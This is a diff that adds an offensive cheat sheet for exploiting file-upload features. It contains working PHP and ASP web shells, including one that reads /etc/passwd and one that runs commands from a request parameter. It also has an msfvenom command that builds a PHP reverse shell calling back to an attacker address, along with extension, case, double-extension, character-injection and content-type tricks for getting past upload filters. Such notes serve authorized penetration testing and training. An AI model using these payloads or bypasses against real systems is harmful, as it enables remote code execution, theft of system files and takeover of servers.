@@ -1,0 +1,49 @@
+#limited uploads
+##potential attack	##file types
+xss			html,js,svg,gif
+xxe/ssrf		xml,svg,pdf,ppt,doc
+DoS			zip,jpg,png
+#webshells
+##basic php file read
+<?php file_get_contents('/etc/passwd'); ?>
+##basic php command execution
+<?php system('hostname'); ?>
+##basic php web shell
+<?php system($_REQUEST['cmd']); ?>
+##basic asp web shell
+<% eval request('cmd') %>
+##generate php reverse shell
+msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+#bypasses
+##client-side bypass
+[ctr+shift+c] Page Inspector
+##blacklist bypass
+###uncommon extension
+shell.phtml
+###case manipulation
+shell.pHp
+###list of PHP extensions
+https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
+###list of ASP extensions
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
+###list of web extensions
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt
+##whitelist bypass
+###double extension
+shell.jpg.php
+###reverse double extension
+shell.php.jpg
+###character injection -Before/After extension
+%20
+%0a
+%0d0a
+/
+.
+...
+##content/type bypass
+###list of web content-types
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
+###list of all content-types
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt
+###file signatures
+https://en.wikipedia.org/wiki/List_of_file_signatures
